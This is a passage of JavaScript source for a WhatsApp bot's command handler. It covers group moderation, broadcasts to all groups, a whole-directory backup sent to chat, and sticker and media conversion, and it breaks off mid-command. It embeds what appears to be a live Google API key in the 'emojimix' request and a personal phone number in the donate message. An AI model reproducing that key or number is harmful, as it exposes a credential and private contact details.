                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcAvi(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcAvi(`Successfully Changed AutoBio To ${q}`)
                }
                await sendReaction('✔');
                break
            case 'mode':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (args.length < 1) return replygcAvi(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    Avishka.public = true
                    replygcAvi(mess.done)
                } else if (q == 'self') {
                    Avishka.public = false
                    replygcAvi(mess.done)
                }
                await sendReaction('✔');
                break
            case 'setexif':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (!text) return replygcAvi(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcAvi(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                await sendReaction('✔');
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (!quoted) return replygcAvi(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcAvi(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcAvi(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Avishka.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Avishka.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcAvi(mess.done)
                } else {
                    var memeg = await Avishka.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcAvi(mess.done)
                }
                await sendReaction('✔');
                break
            case 'block':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Avishka.updateBlockStatus(blockw, 'block').then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'unblock':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Avishka.updateBlockStatus(blockww, 'unblock').then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'leave':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (!m.isGroup) return replygcAvi(mess.group)
                replygcAvi('Bye Everyone 🥺')
                await Avishka.groupLeave(m.chat)
                await sendReaction('✔');
                break
            case 'backup':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                if (m.isGroup) return replygcAvi(mess.private)
                replygcAvi(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await Avishka.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            case 'bcgc':
            case 'bcgroup': 
            await sendReaction('⏳');
            {
                if (!isCreator) return replygcAvi(mess.owner)
                if (!text) return replygcAvi(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await Avishka.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcAvi(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    Avishka.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcAvi(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            await sendReaction('✔');
            break
            case 'getcase':
                await sendReaction('⏳');
                if (!isCreator) return replygcAvi(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcAvi(`${getCase(q)}`)
                await sendReaction('✔');
                break
            case 'delete':
            case 'del':
                await sendReaction('⏳');
            {
                if (!isCreator) return replygcAvi(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcAvi('The message was not sent by a bot!')
                Avishka.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            await sendReaction('✔');
            break

            case 'closetime':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcAvi('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcAvi(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    Avishka.groupSettingUpdate(m.chat, 'announcement')
                    replygcAvi(close)
                }, timer)
                await sendReaction('✔');
                break
            case 'opentime':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcAvi('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcAvi(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    Avishka.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcAvi(open)
                }, timer)
                await sendReaction('✔');
                break
            case 'kick':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Avishka.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'add':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Avishka.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'promote':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Avishka.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'demote':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Avishka.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcAvi(json(res))).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'setname':
            case 'setsubject':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (!text) return 'Text ?'
                await Avishka.groupUpdateSubject(m.chat, text).then((res) => replygcAvi(mess.success)).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'setdesc':
            case 'setdesk':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (!text) return 'Text ?'
                await Avishka.groupUpdateDescription(m.chat, text).then((res) => replygcAvi(mess.success)).catch((err) => replygcAvi(json(err)))
                await sendReaction('✔');
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (!quoted) return replygcAvi(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcAvi(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcAvi(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Avishka.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Avishka.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcAvi(mess.done)
                } else {
                    var memeg = await Avishka.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcAvi(mess.done)
                }
                await sendReaction('✔');
                break
            case 'tagall':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗡 *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                Avishka.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            case 'hidetag':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                Avishka.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            case 'totag':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (!isAdmins) return replygcAvi(mess.admin)
                if (!m.quoted) return replygcAvi(`Reply messages with captions ${prefix + command}`)
                Avishka.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                await sendReaction('✔');
                break
            case 'group':
            case 'grup':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (args[0] === 'close') {
                    await Avishka.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcAvi(`Success In Closing The Group 🕊️`)).catch((err) => replygcAvi(json(err)))
                } else if (args[0] === 'open') {
                    await Avishka.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcAvi(`Success In Opening The Group 🕊️`)).catch((err) => replygcAvi(json(err)))
                } else {
                    replygcAvi(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                await sendReaction('✔');
                break
            case 'editinfo':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                if (args[0] === 'open') {
                    await Avishka.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcAvi(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcAvi(json(err)))
                } else if (args[0] === 'close') {
                    await Avishka.groupSettingUpdate(m.chat, 'locked').then((res) => replygcAvi(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcAvi(json(err)))
                } else {
                    replygcAvi(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                await sendReaction('✔');
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                let response = await Avishka.groupInviteCode(m.chat)
                Avishka.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                await sendReaction('✔');
                break
            case 'revoke':
            case 'resetlink':
                await sendReaction('⏳');
                if (!m.isGroup) return replygcAvi(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcAvi(mess.admin)
                if (!isBotAdmins) return replygcAvi(mess.botAdmin)
                await Avishka.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcAvi(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcAvi(json(err)))
                    await sendReaction('✔');
                break
                case 'p':
            case 'ping':
                await sendReaction('⏳');
            {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Avi Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await Avishka.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Second`,
                            thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            await sendReaction('✔');
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': 
            await sendReaction('⏳');
            {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await Avishka.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            await sendReaction('✔');
            break
            case 'runtime':
                await sendReaction('⏳');
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                Avishka.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                await sendReaction('⏳');
                Avishka.sendMessage(m.chat, {
                    text: `Helllo world`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @Avishka Shavinda`,
                            thumbnailUrl: 'https://telegra.ph/file/29ee3bb601b1fcd8baaca.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
            case 'donate':
            case 'donasi':
                await sendReaction('⏳');
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                Avishka.sendMessage(m.chat, {
                    text: 'You can Donate no; contact me 0772836332 \n\n' + textnate
                }, {
                    quoted: m
                })
                await sendReaction('✔');
                break
case 'owner': 
await sendReaction('⏳');
{
const repf = await Avishka.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
Avishka.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
await sendReaction('✔');
break
            case 'sticker':
            case 'stiker':
            case 's':
                await sendReaction('⏳');
            {
                if (!quoted) return replygcAvi(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await Avishka.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcAvi('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await Avishka.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcAvi(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            await sendReaction('✔');
            break
            case 'smeme':
                await sendReaction('⏳');
            {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcAvi(respond)
                if (!text) return replygcAvi(respond)
                replygcAvi(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await Avishka.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await Avishka.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            await sendReaction('✔');
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':
    await sendReaction('⏳');
{
if (!args.join(" ")) return replygcAvi(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Avishka.downloadAndSaveMediaMessage(quoted, "gifee")
Avishka.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Avishka.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcAvi('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Avishka.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcAvi(`Photo/Video?`)
}
}
await sendReaction('✔');
break
            case 'toimage':
            case 'toimg':
                await sendReaction('⏳');
            {
                if (!/webp/.test(mime)) return replygcAvi(`Reply sticker with caption *${prefix + command}*`)
                replygcAvi(mess.wait)
                let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    Avishka.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            await sendReaction('✔');
            break
            case 'tomp4':
            case 'tovideo':
                await sendReaction('⏳');
            {
                if (!/webp/.test(mime)) return replygcAvi(`Reply sticker with caption *${prefix + command}*`)
                replygcAvi(mess.wait)
                let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Avishka.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            await sendReaction('✔');
            break
            case 'toaud':
            case 'toaudio':
                await sendReaction('⏳');
            {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcAvi(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replygcAvi(mess.wait)
                let media = await Avishka.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Avishka.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            await sendReaction('✔');
            break
            case 'tomp3': 
            await sendReaction('⏳');
            {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcAvi(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replygcAvi(mess.wait)
                let media = await Avishka.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Avishka.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Avimrbot.mp3`
                }, {
                    quoted: m
                })

            }
            await sendReaction('✔');
            break
            case 'tovn':
            case 'toptt': 
            await sendReaction('⏳');
            {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcAvi(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replygcAvi(mess.wait)
                let media = await Avishka.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                Avishka.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            await sendReaction('✔');
            break
            case 'togif': 
            await sendReaction('⏳');
            {
                if (!/webp/.test(mime)) return replygcAvi(`Reply sticker with caption *${prefix + command}*`)
                replygcAvi(mess.wait)
                let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Avishka.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            await sendReaction('✔');
            break
            case 'tourl': 
            await sendReaction('⏳');
            {
                replygcAvi(mess.wait)
                let media = await Avishka.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcAvi(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcAvi(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            await sendReaction('✔');
            break
            case 'emojimix':
                await sendReaction('⏳');
            {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcAvi(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcAvi(`Example : ${prefix + command} 😅+🤔`)
                replygcAvi(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await Avishka.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            await sendReaction('✔');
            break
            case 'toonce':
            case 'toviewonce':
                await sendReaction('⏳');
            {
                if (!quoted) return replygcAvi(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await Avishka.downloadAndSaveMediaMessage(quoted)
                    Avishka.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await Avishka.downloadAndSaveMediaMessage(quoted)
                    Avishka.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            await sendReaction('✔');
            break
            case 'toqr': 
            await sendReaction('⏳');
            {
                if (!q) return replygcAvi(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await Avishka.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            await sendReaction('✔');
            break
            case 'fliptext':
                await sendReaction('⏳');
            {
                if (args.length < 1) return replygcAvi(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcAvi(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            await sendReaction('✔');
            break
            case 'listvn':
                await sendReaction('⏳');
            {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteAvi) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteAvi.length}*`
                replygcAvi(teks)
            }
            await sendReaction('✔');
            break
            case 'liststicker':
                await sendReaction('⏳');
            {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerAvi) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerAvi.length}*`
                replygcAvi(teks)
            }
            await sendReaction('✔');
            break
            case 'listimage':
                await sendReaction('⏳');
            {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageAvi) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageAvi.length}*`
                replygcAvi(teks)
            }
            await sendReaction('✔');
            break
            case 'listvideo':
                await sendReaction('⏳');
            {
